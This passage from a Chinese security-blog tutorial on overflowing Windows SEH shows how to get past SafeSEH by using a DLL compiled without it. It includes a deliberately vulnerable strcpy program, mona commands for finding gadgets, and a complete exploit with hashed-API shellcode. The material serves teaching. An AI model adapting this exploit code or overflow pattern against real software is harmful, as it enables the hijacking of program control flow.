+两种安全措施的结合效果达到了1+1=3的效果，让程序固若金汤。
+
+**2.4.2通过未开启SafeSEH的DLL绕过**
+
+Windows
+Vista大部分模块采用SafeSEH，导致通过覆盖S.E.H跳转的代码无家可归，因为都开启了SafeSEH。所以我们需要为漏洞利用创造条件，我们这里建立一个没有开启SafeSEH的DLL。
+
+在编译选项中关闭SafeSEH(VS 2010只需要删除/SafeSEH 选项即可，默认是关闭的)
+
+![](https://s2.ax1x.com/2019/10/18/KZLmwj.png)
+
+Test.cpp
+
+    
+    
+    #include "stdafx.h"
+    
+    
+    
+    void Vuln()
+    
+    {
+    
+    //存放可利用的gadgets
+    
+    __asm{
+    
+    pop ecx
+    
+    pop ebx
+    
+    ret
+    
+    }
+    
+    }
+    
+    生成Test.dll
+    
+    
+    
+    漏洞程序代码
+    
+    注意要把Test.dll放到和该程序的同一个目录下
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>
+    
+    #include<windows.h>
+    
+    
+    
+    char shellcode[]=””;
+    
+    int MyExceptionhandler()
+    
+    {
+    
+    printf("got an exception ,press Enter to kill the process!n");
+    
+    getchar();
+    
+    ExitProcess(1);
+    
+    return 0;
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+    char buf[200];
+    
+    int zero=0;
+    
+    //__asm int 0x3;
+    
+    __try{
+    
+    printf("In the SEH_test!n");
+    
+    strcpy(buf,shellcode);
+    
+    zero=4/zero;
+    
+    }
+    
+    __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+    LoadLibrary(_T("Test.dll")); //手动加载DLL
+    
+    SEH_test();
+    
+    return 0;
+    
+    }
+    
+
+寻找gadget
+
+通过!py mona module/或者OD的SafeSEH/OllyFindAddr插件分析发现 Test.dll没有开启SafeSEH
+
+![](https://s2.ax1x.com/2019/10/18/KZLKkn.png)
+
+![](https://s2.ax1x.com/2019/10/18/KZLnTs.png)
+
+搜索Gadget
+
+!py mona.py findwild -s pop reg32# pop reg32 # ret -m “Test.dll”
+
+我们在Test.dll模块中我们埋藏了可用gadget
+
+所以很容易地找到符合的地址为0x6DAB13CE
+
+同时通过!py mona.py mod 发现Test.dll模块没有开启SafeSEH
+
+![](https://s2.ax1x.com/2019/10/18/KZLMYq.png)
+
+接下来就和上一节的内容类似了，使用POP POP RET结合JMP SHORT 跳转进入shellcode。
+
+程序实例：
+
+    
+    
+    #include "stdafx.h"
+    
+    #include<stdio.h>
+    
+    #include<windows.h>
+    
+    
+    
+    
+    
+    char shellcode[]=
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
+    
+    "x90x90x90x90x90x90x90x90"
+    
+    "xEBx06x90x90"  // Point to Next SEH record
+    
+    "xCEx13xAEx6D" //SE handler 0x6DAE13CE
+    
+    //"x70xfex12x00"//SE handler
+    
+    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
+    
+    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
+    
+    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
+    
+    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
+    
+    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
+    
+    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
+    
+    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
+    
+    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
+    
+    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
+    
+    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
+    
+    "x53xFFx57xFCx53xFFx57xF8";
+    
+    
+    
+    int MyExceptionhandler()
+    
+    {
+    
+    printf("got an exception ,press Enter to kill the process!n");
+    
+    getchar();
+    
+    ExitProcess(1);
+    
+    return 0;
+    
+    }
+    
+    
+    
+    void SEH_test()
+    
+    {
+    
+    char buf[200];
+    
+    int zero=0;
+    
+    //__asm int 0x3;
+    
+    __try{
+    
+    printf("In the SEH_test!n");
+    
+    strcpy(buf,shellcode);
+    
+    zero=4/zero;
+    
+    }
+    
+    __except(MyExceptionhandler()){};
+    
+    }
+    
+    
+    
+    int main(int argc, char* argv[])
+    
+    {
+    
+    LoadLibrary(_T("Test.dll"));
+    
+    SEH_test();
+    
+    return 0;
+    
+    }
+    
+
+如果程序本身的DEP是关闭的，那么效果应该和我这里是一样的。
+
+当然，如果地址是在调试模式下确定的，那么也只有debug时候才能成功利用，主要原因是调试状态和实际状态的内存机制可能存在差异。解决方案就是使用getchar()/int
+0x3中断(建议前者，因为每次编译DLL的载入基地址可能都会变化，即使没有开启ASLR)，然后再Attach来调试。
+
+![](https://s2.ax1x.com/2019/10/18/KZL86U.png)
+
+**2.4.3扩展思路：结合ROP绕过DEP和SafeSEH的个人理解**
+
+开启DEP
+
+硬件 DEP 利用了在 DEP 兼容的 CPU 的 NX(“无执行页保护”，AMD 规格)或者 XD(“不 能执行”，intel
+规格)位，并且将特定部分的内存(只能包含数据，比如说默认堆，栈，内 存池)标记为不可执行。
+
+当尝试在一个 DEP 保护的数据页执行代码时，将会发生访问拒绝
+
+(STATUS_ACCESS_VIOLATIO(N 0xc0000005))
+
+也就是说我们放在栈帧中的shellcode将不会被成功执行
+
+获取WinExec的函数的地址，可以算出WinExec相对kernel32的偏移地址为0x8BE0D
+
+在没有开启ASLR的时候，是可以直接跳转的。只需要先在栈中放好参数即可。
+
+![](https://s2.ax1x.com/2019/10/18/KZL1pV.png)
+
+![](https://s2.ax1x.com/2019/10/18/KZLQf0.png)
+
+但是通过覆盖SEH是无法直接跳转到WinExec函数的，因为Kernel32也开了SafeSEH，加上DEP的开启，导致我们POP POP
+RET方案也失效了。不过我们依旧可以通过未开启SafeSEH/DEP的模块实现绕过。
+
+但目前通用的方案就是DEP绕过方案。但是在开启SafeSEH之后，通过SEH覆盖的即使使用ROP绕过难度比较大。这部分在之后的学习中会进一步探讨。
+
+## 总结
+
+S.E.H结构的覆盖是Win下的一个特色，学习这部分知识非常有意思，因为在Linux下的溢出中从来没有接触过，听周围做PWN的朋友说最近也是出了不少Win下的PWN，很多都和S.E.H机制有所关联。
+
+最后感谢二进制安全的前辈们给我的指引，作者水平有限，如有错误欢迎评论区指正。
+
+## 参考文献
+
+[1]wwzzww.windows-SEH详解[DB/OL].
+
+<https://bbs.pediy.com/thread-249592.htm>, 2019-2-22
+
+[2] [冷月宫主](https://me.csdn.net/e_wsq).Win32结构化异常处理(SEH)——异常处理程序( **try/**
+except)[DB/OL]
+
+<https://blog.csdn.net/e_wsq/article/details/17008097> ,2013-11-28
+
+[3][护花使者cxy](https://me.csdn.net/qq_38924942).Windows XP sp3 系统安装 Windbg 符号文件
+Symbols 时微软失去支持的解决方案[DB/OL].
+
+<https://blog.csdn.net/qq_38924942/article/details/87801649,2019-02-20>
+
+[4][tang3](http://blog.nsfocus.net/author/tang3/),看教程学溢出之SEH利用[DB/OL].<http://blog.nsfocus.net/tutorial-overflow/,2017>
+
+[5] [chen_sunn](https://me.csdn.net/chen_sunn),开始写Immunity Debugger
+PyCommand.[DB/OL].
+
+<https://blog.csdn.net/chen_sunn/article/details/45113065,2015-04-18>
+
+[6] [BugMeOut](https://me.csdn.net/wang471003247).为windbg安装mona.py[DB/OL].
+
+<http://blog.csdn.net/bugmeout/article/details/45199139,2015-04-22>
+
+[7]王清.0Day安全:软件漏洞分析技术[M].第二版.电子工业出版社,2011
+
+[8]看雪翻译.Exploit编写教程[PDF],2010
+
+[9] [Umiade](https://me.csdn.net/qq_19550513).SafeSEH原理及绕过技术浅析[DB/OL].
+
+<https://blog.csdn.net/qq_19550513/article/details/64438170,2017-03-21>
+
+[10] [swartz_lubel](https://me.csdn.net/swartz_lubel),栈溢出笔记1.10
+基于SEH的栈溢出[DB/OL].
+
+<https://blog.csdn.net/swartz_lubel/article/details/77921893,2017-09-10>
+
+[11][zhou191954](https://me.csdn.net/zhou191954)./SafeSEH编译选项 :
+原理及绕过技术浅析[DB/OL]
+
+.<https://blog.csdn.net/zhou191954/article/details/38020481,2014-07-21>
+
+[12] [woijal520](https://me.csdn.net/woijal520).Win32 SEH 详解[DB/OL].
+
+<https://blog.csdn.net/woijal520/article/details/7191665,2012-01-10>
+
+[13][Yx0051](https://me.csdn.net/Yx0051).利用未启用SafeSEH模块绕过SafeSEH[DB/OL].
+
+<https://blog.csdn.net/Yx0051/article/details/76803514,2017-08-07>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Migraine殇** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/189093](/post/id/189093)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Windows](/tag/Windows)
+  * [Pwn](/tag/Pwn)
+  * [二进制](/tag/二进制)
+
+ **+1** __9赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t017c97fc7e3becfd42.jpg) Migraine殇
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
